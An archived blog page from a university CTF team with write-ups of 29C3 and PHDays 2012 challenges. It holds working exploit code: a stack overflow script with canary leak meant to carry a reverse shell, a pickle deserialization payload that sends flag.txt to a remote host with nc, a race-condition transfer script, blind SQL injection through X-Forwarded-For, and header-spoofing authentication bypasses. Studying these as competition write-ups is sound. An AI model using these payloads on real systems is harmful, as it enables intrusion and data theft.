
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="It&#8217;s a version update service. If the input version number is smaller than current version, remote server will send you back the current &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net/www/blog/page/6">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">blue-lotus</a></h1>
  
    <h2>Security Research Team @ Tsinghua University</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/29c3-ctf-exploitation-300-update_server/">29C3 CTF Exploitation 300 Update_server</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-01-01T00:00:00+08:00" pubdate data-updated="true">Jan 1<span>st</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>It&#8217;s a version update service. If the input version number is smaller than current version, remote server will send you back the current version. If the input version number is bigger, remote server will save the input version number and ask for some &#8220;link&#8221; information which will lead to buffer overflow. However, the update of version numver is authenticated by a password given by remote runtime parameter. We should bypass the authentcation before we exploit the buufer overflow. I noticed some code as below:</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/update_server_equal_version.jpg" alt="update_server_equal_version" /></p>

<p>If the input version number equals current version number, the server will send back the input version string without adding null-byte at the end of the intput buffer. After checking the stack layout, we will surprisedly find that the password is right after the buffer.</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/update_server_stack.jpg" alt="update_server_stack" /></p>

<p>So we can construnt a long enough string to get the password exposed. It is &#8220;1n53cUr3-pppAssW0rD&#8221;. We are not finished here, we&#8217;ve just started.</p>

<p>Notice that the program is using gcc stack protection mechanism. Stack is protected against bufferoverflow with the 4-byte canary. What&#8217;s more, the servie is running with ASLR.</p>

<p>Carefully check the vulnerable code again:</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/update_server_exploit.jpg" alt="update_server_exploit" /></p>

<p>Before reveiving the second long input buffer, the program will show all the versions to us. Versions are stored in an array. The length is parsed from the first byte. So we can construct a large array length to get more strings exposed on the stack! Using such trick, we can get 4 byte canary and even address in the stack to bypass ASLR!</p>

<p>What&#8217;s left is quite easy, just run your code and enjoy your flag:)</p>

<pre><code>import sys
import time
import socket
shellcode = WE_USE_REVERSE_TCP_SHELL

import string
def chr2hex(s):
  ss = ""
  for c in s:
    if c in string.printable:
      ss += c
      continue
    h = hex(ord(c))[2:]
    if len(h) == 1: h = "0"+h
    ss += "\\x" + h
  return ss


password = "1n53cUr3-pppAssW0rD"

s = socket.socket()
s.connect(("94.45.252.235", 1024))
#s.connect(("166.111.132.184", 1024))

#print s.recv(10000)
#s.send("\x013.0"+"A"*124)
#print s.recv(10000)
#print s.recv(10000)

print s.recv(10000)
n = 90
canary = "\x00\x4e\xae\x8a"

#s.send("\x013.0"+"A"*124)
s.send(chr(n)+"4"*127)
print s.recv(10000)
print s.recv(10000)
s.send(password)

print s.recv(10000)
ret = s.recv(10000)
print ret

print "*********"
print chr2hex(ret)
i = ret.rfind(password)
print "*********"
print chr2hex(ret[i+128:i+128+4]) # print canary

# hardcoded address is acquired from above output
buf = "\x90"*256+canary+"\x90"*(288-256-4)+"\x9c\xf7\xba\xbf"+"\x90"*600+shellcode+\
    "A"*(1024-288-4-600-len(shellcode))

s.send(buf)

print s.recv(10000)
print s.recv(10000)
print s.recv(10000)
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/29c3-ctf-minesweeper/">29C3 CTF Exploitation 100 Minesweeper</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-12-31T00:00:00+08:00" pubdate data-updated="true">Dec 31<span>st</span>, 2012</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>There&#8217;s a python remote service in this challenge, which runs a classical windows game &#8220;minesweeper&#8221;. You can send command to play the game and get game status from remote server. What&#8217;s interesting in the challenge is the load and save mechanism. If you choose to send &#8220;save&#8221; command, you will get a string which you can use it to restore the game. However, it uses a Python module &#8220;Pickle&#8221; to save and load the game status object. &#8220;Pickle&#8221; module has vulnerablity which you can exploit it to execute arbitrarily command. Vulnerable code is as below:</p>

<pre><code>def load(self, data):
    self.__dict__ = pickle.loads(data)

def save(self):
    return pickle.dumps(self.__dict__, 1)
</code></pre>

<p>However, to construnct malformed data for the server to load is not that easy. It uses a remote side key to encode the game status data after &#8220;save&#8221; function and decode it before &#8220;load&#8221;. So in order to construct what we want to pass to &#8220;load&#8221; correctly, we should first figure the encryption key out. It&#8217;s an easy xor algorithm. We can win a game manully and use the mines&#8217; position information to construct the encoding process locally. With the help of returned &#8220;save&#8221; string for restore, we can recover the remote key. Using the key, we can construnt anything evil to capture the flag.</p>

<p>Code sample for exploitation is below:</p>

<pre><code>#You win
#  0123456789012345
# +----------------+
#0|0001!22110000000|0
#1|00012!2 10000000|1
#2|0000112110000000|2
#3|1110000111000000|3
#4|1 100001 1001221|4
#5|2210000111001  1|5
#6| 100001110001221|6
#7|1100001 10000000|7
#8|0000001111110000|8
#9|0000000001 10000|9
#0|0000001111110000|0
#1|0111002 31001221|1
#2|12 1002  2111  1|2
#3| 211001222 11343|3
#4|11000000011101  |4
#5|0000000000000122|5
# +----------------+
f = Field(16, 16, 20)
mines = [(0, 6), (0, 13), (1, 4), (2, 12), (4, 0), (5, 1), (7, 1), (7, 7), (7, 11), (7, 12), (8, 4), (8, 12), (10, 9), (10, 13), (13, 5), (13, 12), (14, 5), (14, 12), (14, 14), (15, 14)]
f.set(mines)

sg64 = "HPplCE7Muyvp1j5A14955hXLFCe9haqb75ao1xO90X7+Natm428OJ/lXrgXEB6us8h7+3SasoqCOcNN1erlRMqRgdk5vxDDasf1GoAK1px95fLRcaXQzvQ9yNeGxSnjsfLljG4OyP7ETeRsEdYfOAemHJNmFf/PWjED9YVVCXopwFN5thdVzetzod5VbdjM7oBwOf1hzCFCCp6HPPORonEEgTxAukve+Jl/LUxKgRAlNKoTPSCQVNae7T7ucp0d6xFfpqHpAcjGb+WxJoCfo+59uCIb4GZBM7JZEH3Z+8Bswnpr5ZbfF/9PZ+CEcTPI/p444N0bX9r3lIg=="
sg = base64.standard_b64decode(sg64)
msg = f.save()
print f.__dict__

h = hashlib.sha1()
h.update(msg)
msg = "4n71cH3aT" + h.digest() + msg
key = ""
print len(msg),len(sg)

for i in xrange(0, len(msg)):
    key += chr(ord(msg[i]) ^ ord(sg[i]))
print key

class Exploit(object):
  def __reduce__(self):
      comm = "cat flag.txt | nc 166.111.132.184 5678"
      return (os.system, (comm,))

msg = "cos\nsystem\n(S'/bin/sh'\ntR.'\ntR."
msg = pickle.dumps(Exploit())
h = hashlib.sha1()
h.update(msg)
msg = "4n71cH3aT" + h.digest() + msg
tmp = ""

for i in xrange(0, len(msg)):
    tmp += chr(ord(msg[i]) ^ ord(key[i]))
msg = tmp

print "Your savegame: " + base64.standard_b64encode(msg)
print ""
print ""

tmp = ""
for i in xrange(0, len(msg)):
    tmp += chr(ord(msg[i]) ^ ord(key[i]))
msg = tmp
if msg[0:9] != "4n71cH3aT":
    print (True, "Unable to load savegame (magic)")
h = hashlib.sha1()
h.update(msg[9+h.digest_size:])
if msg[9:9+h.digest_size] != h.digest():
    print (True, "Unable to load savegame (checksum)")
f.load(msg[9+h.digest_size:])
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/ccc-ctf_node/">29c3ctf Node Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-12-30T00:00:00+08:00" pubdate data-updated="true">Dec 30<span>th</span>, 2012</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This a web problem, using node.js as the programming language. It only gives a portal showing a login form.</p>

<p>When I started on this problem, there already have been some discoveries made by my team mates(Thanks to Jay and hqdvista). They found this url: <a href="http://94.45.252.237:1024/robots.txt">http://94.45.252.237:1024/robots.txt</a> , as indicated, we got <a href="http://94.45.252.237:1024/pages.js.">http://94.45.252.237:1024/pages.js.</a></p>

<p>After beautifying using <a href="http://jsbeautifier.org,">http://jsbeautifier.org,</a> I reviewed the code, and it shows that there exists another page called auth.js, but <a href="http://94.45.252.237:1024/pages.js">http://94.45.252.237:1024/pages.js</a> is incorrect. Dive into the page.js code again, it&#8217;s filtered out by RE &#8220;/^\/auth&#46;js/&#8221;, so we tried <a href="http://94.45.252.237:1024//auth.js">http://94.45.252.237:1024//auth.js</a> . Wow, it works!</p>

<p>After some comprehension work, we figured out that, the check in auth.js will try to authenticate admin using 2 methods, the first is to check username/password, the second is to check useragent/ip. But we have none of them to even give a try.</p>

<p>Later, according to auth.js, we found this url: <a href="http://94.45.252.237:1024/stats.txt">http://94.45.252.237:1024/stats.txt</a> , which contains a list of login records, but without password. Review the code of auth.js, we can find that if we use the admin useragent and ip, we can get admin access. I wrote a script to try all the ua/ip pair in the stats.txt, resulting the first one is the admin, so that we can access admin page using the command below:</p>

<p>curl -D head.txt -s -A &#8216;Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)&#8217; -H &#8216;X-Forwarded-For: 8.8.8.8&#8242; <a href="http://94.45.252.237:1024/admin">http://94.45.252.237:1024/admin</a></p>

<p>However, we just got the same stats list file as previous one, but the content is a bit different. So I reviewed the code of its generation, in <a href="http://94.45.252.237:1024/pages.js,">http://94.45.252.237:1024/pages.js,</a> we found that, when rendering admin page, the first local variable passed in is flag, so the flag is in admin page! But we still need to find out which one is.</p>

<p>After searching the internet, we know that express.js use jade html template, so the admin page should be admin.jade. Then we tried <a href="http://94.45.252.237:1024/admin.jade">http://94.45.252.237:1024/admin.jade</a> , hooray! It reveals that the flag is the string after “Admin &#8211; ”.</p>

<p>Happy cracking!</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/29c3ctf-web300-pwsafe-writeup/">29c3ctf Web300 Pwsafe Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-12-30T00:00:00+08:00" pubdate data-updated="true">Dec 30<span>th</span>, 2012</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This is a rather straight-forward web problem with a little cryptography trick and it&#8217;s solved under the joint effort of fqj and me. The initial page consists of login form and register form. After registration user can login in to a pastebin like page in which he or she can edit and save text. Those are nearly all the functionalities.</p>

<p>At first we tried sqli on form, but doesn&#8217;t work. Further investigation on potential xss also doesn&#8217;t work. Then we turned to focus on http headers. It seems there are some patterns in &#8220;session&#8221; item of cookie. After comparing several accounts&#8217; cookie with different names and from different computers, fqj found the cookie is actually</p>

<pre><code>954a33ddafa959cf59247cd21b4cc163 + md5(username) + md5(ip)
</code></pre>

<p>wow, very useful discovery. The &#8220;ip&#8221; can be forged by X-Forwarded-For header.</p>

<p>Then, how to use this important pattern? Inferred from the statement of this problem, administrator account may be needed. After fuzzing and crawling we found juicy uris, /admin and /server-status. Based on the return of /admin we figure out that the administrator account username is &#8220;admin&#8221;, and accessing /server-status shows connections to /admin, which contains ip &#8220;1.2.3.4&#8243;. Why not give it a try?</p>

<p>So construct session cookie with username &#8220;admin&#8221; and ip &#8220;1.2.3.4&#8243;, access login page, and key is there <img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/29c3ctf-shop-writeup/">29c3ctf Shop Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-12-30T00:00:00+08:00" pubdate data-updated="true">Dec 30<span>th</span>, 2012</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This problem is solved by jay. I write this writeup to admire his work!</p>

<p>This a php web problem. After diving into the website, we found that, it&#8217;s a online shop, with 2 items in it, but the account balance is 0, however we can have some bonus code the reduce the price by 5, so we can by the unimportant note, which shows file not found. So we can deduce that if we have a 1337 bonus to buy the important note, we can have the flag.</p>

<p>Scan this website(use wvs, wwwscan, nikto, etc), we can get <a href="http://94.45.252.234/free.php">http://94.45.252.234/free.php</a> , which can generate 5 bonus for us. Then somebody tried some malformed bonus token, such as FpqIyUuxZClovPxTaXfWHGEKeNBOBE892V59/fYAvON/MmQV , at the top of the page, a php warning shows, revealing another page: <a href="http://94.45.252.234/reduction.inc">http://94.45.252.234/reduction.inc</a></p>

<p>The code in reduction.inc shows how token are generated and verified. So we need to construct another token of 1337 bonus to crack it. Note that, the crypto method uses ofb mode, which is very weak. The <a href="http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation">wiki</a> has a simple illustration on how it works. Actually, we don&#8217;t need the key and iv to do encryption, what we need is the original plain text, then we can construct new encryption using xor operation: (original&#95;encyption xor original&#95;plain&#95;text xor new&#95;plain_text). The original plain text is &#8220;$salt.5.1&#8243; So we only need the salt, which is 16 bytes long, indicated by 3-DES. And this is where I got stucked.</p>

<p>But jay solved this problem using a python script:</p>

<pre><code>import binascii, base64;
import urllib
import urllib2

enc_salt= "169a88c94bb1642968bcfc536977d61c";
tail = "730af8d0955fc1fbfbfa3540cd9f10b68f93c85233";


def gen_reduction(byte_index, mask):
       enc_salt_bin = binascii.unhexlify(enc_salt);
       left = enc_salt[0:2*byte_index];
       middle = enc_salt[2*byte_index:2*byte_index+2];
       right = enc_salt[2*byte_index+2:32];
       middle = hex(mask ^ (16*int(middle[:1], 16) + int(middle[1:], 16)));
       middle = middle[2:];
       if(1==len(middle)):
               middle = '0' + middle;
       reduction = binascii.unhexlify(left + middle + right + tail);
       return base64.b64encode(reduction);

def test_reduction(byte_index, mask):
       url = 'http://94.45.252.234/cart.php'
       user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
       values = {'reduction' : gen_reduction(byte_index, mask),
                'Add Bonus Code' : 'True'
               }
       headers = { 'User-Agent' : user_agent }

       data = urllib.urlencode(values)
       req = urllib2.Request(url, data, headers)
       response = urllib2.urlopen(req)
       page = response.read()
       if('h' == page[1]):
               return 1;
       return 0;

for i in range(16):
       salt = "";
       for j in range(1,256):
               if(1 == test_reduction(i,j)):
                       byte = hex(j ^ 0x2e);
                       print byte
</code></pre>

<p>This script is a little complicated. It reduces the attempt time of cracking salt from 256<sup>16</sup> down to 256*16. The important thing is that, the server will response with warning notice when we construct a fake bonus token which contains less than 2 period symbols, which is caused by following line:</p>

<pre><code>    list($in_salt, $amount, $rnd) = explode('.', $reduction);
</code></pre>

<p>This also tells us, the salt does not contain period symbol. So we can construct a fake token which contains only 1 period symbol first, then try to translate each char of the salt to period, if success, then there will be no warning, otherwise there will be php complaint:</p>

<pre><code>Notice: Undefined offset: 2 in /var/www/reduction.inc on line 21
</code></pre>

<p>So we can get 1 char in 256 attempt. This is how the python script works.</p>

<p>After cracking the salt, we already knows how to construct the encryption, and md5 is also straight-forward.</p>

<p>Admire jay again! Any comments?</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/29c3ctf-regexdb/">29c3ctf Web100 Regexdb Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-12-30T00:00:00+08:00" pubdate data-updated="true">Dec 30<span>th</span>, 2012</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Problem Link: <a href="https://29c3ctf.aachen.ccc.de/challenges/16/">regexdb</a></h2>

<pre><code>**Description**

Ever played Googlewhack? Well, this is a bit [easier][2] and gives you more power, enjoy.
</code></pre>

<h2>Quote From google shared doc:</h2>

<pre><code>题目给的提示是googlewhack，这个的意思就是查询时仅返回一条结果。

首先经过测试，所有的输入要在--之间。  
比如:输入 -- 返回结果是 18 .

输入 - . - 返回结果是： results: 1: 29C3_NotAKey
</code></pre>

<h2>Some useful information:</h2>

<pre><code>Query language “analysis” (Jay):

\- . is single character
\- * is wildcard
\-  | is OR operator
\-  ^ is BEGINNING OF STRING operator
</code></pre>

<h2>Examples</h2>

<pre><code>** - 18 results (total in db)
*29C3* - 12 results
*^29C3* - 6 results
*.{40}* - 3 results (all results which are 40 chars long)
**!!This is a perl regular expression engine!!**
</code></pre>

<p>First step is to sort all the 18 result by length, use a simple script to help.</p>

<p><code>wget -q -O - --post-data="input=-$1-" "http://94.45.252.233/" | grep Results</code></p>

<p>Using the regex : <code>^.{$length}$</code> to seperate all the input data.</p>

<p>Then we can got almost all the wrong answers:</p>

<pre>29C3_
Key: None
Key: 29C3_
29C3_Wrong
Hello World!
29C3_NoBadOne
29C3_____NO_____
Wrong: 29C3_Wrong
K3y: 29C3_AlsoBad
29C3_ImSimplyWrong
23 23 23 23 23 23 23 23
This one is unrelated...
Key: 29C3_AnotherOneWhichIsWrong
29C3_NotAKey &lt;- this one is not a key
42 42 42 42 42 42 42 42 42 42 42 42 42 42
Key: 29C3_??        length 40
Key: 29C3_??        length 40
</pre>


<p>Then we know the answer is one of the last 2 key.</p>

<p>(after got the flag,we know that they are both the keys)</p>

<p>Construct the regex expression <code>^.{$left}[$query_set].{$right}$</code></p>

<p>Here we need $left+$right equal to 39 and find the unique $query_set,then it&#8217;s the answer.</p>

<p>We can simply use escape grammar to do this. It does not support [a-zA-Z] grammar,</p>

<p>so we have to write all the query characters.</p>

<p>Starts from <code>$query="\1\2...\7f"</code>,check the result wether include character &#8217;2&#8242;</p>

<p>Binary search here is a better choice.</p>

<p>After all above, we got the answer:</p>

<p><code>Key: 29C3_Well.This/Is#Not+The|Wrong?Key</code></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/29c3-exp200-ru133/">29C3ctf_exp200_ru1337_writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-12-30T00:00:00+08:00" pubdate data-updated="true">Dec 30<span>th</span>, 2012</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>ru1337 为32位linux程序。<a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/ru1337.rar">ru1337</a></p>

</div>
  
  
    <footer>
      <a rel="full-article" href="/29c3-exp200-ru133/">Read on &rarr;</a>
    </footer>
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/hack_u_too-bin50/">Hack_u_too Bin500 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-12-24T00:00:00+08:00" pubdate data-updated="true">Dec 24<span>th</span>, 2012</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>bin500是典型的逆向分析题。题目:<a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/hardcore.exe">hardcore</a></p>

<p>包含简单的反调试器，算法逆向</p>

</div>
  
  
    <footer>
      <a rel="full-article" href="/hack_u_too-bin50/">Read on &rarr;</a>
    </footer>
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/phday-ctf-2012-quals-real-world-200/">PHDay CTF 2012 Quals Real World 200</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-12-18T00:00:00+08:00" pubdate data-updated="true">Dec 18<span>th</span>, 2012</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>这个是一个银行，你帐号只有1000块，然后要给别人打钱，要打别人2000快。</p>

<p>问题：竞争，系统没有用事务</p>

<p>恼人的地方：需要用多个不同的session去登录同一个帐号，同一个session登录多次转账没有用，因为每一次请求sessionid会变化，那么第二个请求就成了not authorized.</p>

<p>脚本：</p>

<pre><code>#!/bin/bash -e
wget "http://ctf.phdays.com:1629/?act=register" --post-data="login=$1&amp;pass1=$1&amp;pass2=$1&amp;email=123%40123.com" -O /dev/null -q
wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar --keep-session-cookies  --load-cookies=cookiejar -O /dev/null -q
wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar2 --keep-session-cookies  --load-cookies=cookiejar2 -O /dev/null -q
wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar3 --keep-session-cookies  --load-cookies=cookiejar3 -O /dev/null -q
wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar4 --keep-session-cookies  --load-cookies=cookiejar4 -O /dev/null -q
wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar5 --keep-session-cookies  --load-cookies=cookiejar5 -O /dev/null -q
wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&amp;password=$1" --save-cookies=cookiejar6 --keep-session-cookies  --load-cookies=cookiejar6 -O /dev/null -q
wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar --save-cookies=cookiejar --keep-session-cookies -O /dev/null -q &amp;
wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar2 --save-cookies=cookiejar2 --keep-session-cookies -O /dev/null -q &amp;
wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar3 --save-cookies=cookiejar3 --keep-session-cookies -O /dev/null -q &amp;
wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar4 --save-cookies=cookiejar4 --keep-session-cookies -O /dev/null -q &amp;
wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar5 --save-cookies=cookiejar5 --keep-session-cookies -O /dev/null -q &amp;
wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amp;amount=1000" --load-cookies=cookiejar6 --save-cookies=cookiejar6 --keep-session-cookies -O /dev/null -q &amp;
while true; do
    if ps aux | grep -v grep | grep wget &gt;/dev/null; then
        sleep 1
    else
        wget "http://ctf.phdays.com:1629/?act=main" --load-cookies=cookiejar2 --save-cookies=cookiejar2 --keep-session-cookies -O - -q | html2text -utf8
        rm cookiejar*
        exit 0
    fi
done
</code></pre>

<p>运行结果：</p>

<pre><code> PHDays_E-Banking  
 * Home_Page  
 * Transactions  
 * Log_out  
 * Current balance: 0 Logged in as luketest6 Your flag: e8b434d21354e1a2ab61f4c672109559  

 =============================================================================== © 1.21 GigaWatt, LLC. All Rights Reserved.
</code></pre>

<p>如果一次没成功，用不同的参数重新运行就好了</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/phday-ctf-2012-quals-real-world-100/">PHDay CTF 2012 Quals Real World 100</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-12-18T00:00:00+08:00" pubdate data-updated="true">Dec 18<span>th</span>, 2012</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>此题就是一个web应用，让你获取flag。有代码提供。</p>

<p>思路分析：</p>

<p>首先这是一个MVC分层不错的php应用。</p>

<p>首先看Models：</p>

<p>在models/News.php中，有这样一段代码</p>

<p>这段代码在发表评论的时候被调用</p>

<p>models/News.php:</p>

<pre><code>public function addComment($id, $data)
{
    $sql = "INSERT INTO `comments` SET "
         . "`news_id` = " . (int)$id . ", "
         . "`username` = " . $this-&gt;db-&gt;quote($data['username']). ", "
         . "`text` = " . $this-&gt;db-&gt;quote($data['text']). ", "
         . "`date_posted` = NOW(), "
         . "`ip` = INET_ATON('" . $data['ip'] . "')";

    $this-&gt;db-&gt;query($sql);
}
</code></pre>

<p>大家看到ip的字段，并没有转义，看起来是有希望可以注入的。</p>

<p>接下来，看到$data[&lsquo;ip&rsquo;]的来源是：</p>

<p>library/Micro/Http/Request.php文件中：</p>

<pre><code>public function getClientIp($checkProxy = true)
{
    if ($checkProxy &amp;&amp; $this-&gt;getServer('HTTP_CLIENT_IP') != null) {
        $ip = $this-&gt;getServer('HTTP_CLIENT_IP');
    } else if ($checkProxy &amp;&amp; $this-&gt;getServer('HTTP_X_FORWARDED_FOR') != null) {
        $ip = $this-&gt;getServer('HTTP_X_FORWARDED_FOR');
    } else {
        $ip = $this-&gt;getServer('REMOTE_ADDR');
    }

    return $ip;
}
</code></pre>

<p>可见，就是先检查HTTP请求header中的CLIENT&#95;IP然后检查X&#95;FORWARDED_FOR，如果都不存在就用远端的地址。</p>

<p>那么HTTP请求中CLIENT&#95;IP和FORWARDED&#95;FOR都是可以注入的地方。我就用X&#95;FORWARDED&#95;FOR了</p>

<p>由于这个是INSERT语句，无法获知查找出来的内容，于是只能通过INSERT语句的成功与否（网页返回200或者500）来判断了。</p>

<p>首先一些简单的测试可以发现，ip一列的有not null的属性，所以说只要让INET_ATON的返回值为NULL页面就会错误。</p>

<p>那么首先第一测试就是找出表名，乱猜得到表名为flags</p>

<pre><code>curl "http://ctf.phdays.com:1411/news/1/add-comment"  -d "username=&amp;text=" -H "X_Forwarded_For: ' + (SELECT * FROM flags);" 
</code></pre>

<p>然后猜列书，可以用二分法，在SELECT语句后用ORDER BY 列号，找到最大的不会出错的列号就是flags表的列数。</p>

<p>发现只有一列。</p>

<p>然后猜列名，把*改成你要猜的列名，出错就是不存在，猜得列名是flag。</p>

<p>然后猜行数，通过加LIMIT X, 1，X为整数就可以了。发现只有1行。</p>

<p>这是一个一行一列的表。</p>

<p>接下来就是关键了，由于是INSERT语句无法获知查询的结果，所以只能根据查询是否有结果来逐步解决。</p>

<p>首先用二分法确定值有多长，二分的方式是：</p>

<pre><code>$ curl "http://ctf.phdays.com:1411/news/1/add-comment"  -d "username=luke&amp;text=sun3" -H "X_Forwarded_For: ' + (SELECT * FROM flags WHERE length(flag, 32) &lt;= ));" 
</code></pre>

<p>将32换成其他的数来猜，利用二分法，找到最小的不会出错的数，便是长度。</p>

<p>接下来二分内容，需要逐字节二分，原理同上，下面贴出一个示例的请求，</p>

<pre><code>$ curl "http://ctf.phdays.com:1411/news/1/add-comment"  -d "username=luke&amp;text=sun3" -H "X_Forwarded_For: ' + (SELECT * FROM flags WHERE ord(substring(flag, XXX, 1)) &lt;= XXX));"
</code></pre>

<p>其中两个XXX分别是要猜第几个字节（1-32）和猜的值的最大值。找到最小的不出错的猜值，就是结果。然后算出二分出的ascii码对应出的字符（串），结果是我也不记得结果是啥了。</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/7/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/blog/page/5/">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
      </li>
    
      <li class="post">
        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
